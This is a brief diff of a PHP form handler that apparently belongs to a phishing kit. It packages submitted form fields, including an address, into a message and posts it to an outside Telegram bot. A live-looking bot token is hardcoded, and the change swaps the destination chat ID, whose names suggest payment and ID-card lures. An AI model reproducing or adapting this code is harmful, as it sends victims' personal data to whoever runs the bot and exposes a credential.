@@ -10,7 +10,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $message .= "Address: $address\n";
 
     $telegramToken = "7595198672:AAGHr15kpkev7Hlw7ehhKo96shzOT2WS2lM";
-    $chatId = "Copaymentnowbot"; // Ganti dengan ID chat Anda
+    $chatId = "IDcardmucom"; // Ganti dengan ID chat Anda
 
     $url = "https://api.telegram.org/bot$telegramToken/sendMessage";
 
